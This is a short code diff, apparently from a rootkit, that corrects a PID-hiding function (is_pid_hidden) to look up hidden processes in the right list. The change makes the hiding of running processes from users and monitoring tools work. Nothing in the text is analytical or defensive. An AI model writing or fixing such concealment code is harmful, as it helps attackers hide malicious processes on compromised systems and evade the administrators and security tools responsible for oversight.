@@ -136,7 +136,7 @@ int unhide_file(const char* name){
 // HIDE THOSE PIDS
 int is_pid_hidden(int pid){
 	struct list_pids_node* node;
-	list_for_each_entry(node, &list_files, list){
+	list_for_each_entry(node, &list_pids, list){
 		if (node->pid == pid)
 			return 1;
 	}
